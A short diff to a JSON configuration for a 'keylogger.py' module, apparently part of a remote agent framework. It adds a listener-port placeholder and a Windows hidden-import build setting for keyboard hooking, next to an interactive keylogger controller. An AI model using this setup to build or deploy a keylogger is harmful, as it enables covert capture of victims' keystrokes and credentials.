@@ -4,11 +4,16 @@
     "file_name": "keylogger.py",
     "placeholders": {
         "__ipaddr__": "Agent listener IP",
-        "12345": "Agent listener port"
+        "__controller_port__": "Agent listener port"
     },
     "controller": {
         "enabled": true,
         "label": "Keylogger Controller",
         "description": "Interactive keylogger control interface"
+    },
+    "build": {
+        "hidden_imports": [
+            "pynput.keyboard._win32"
+        ]
     }
 }
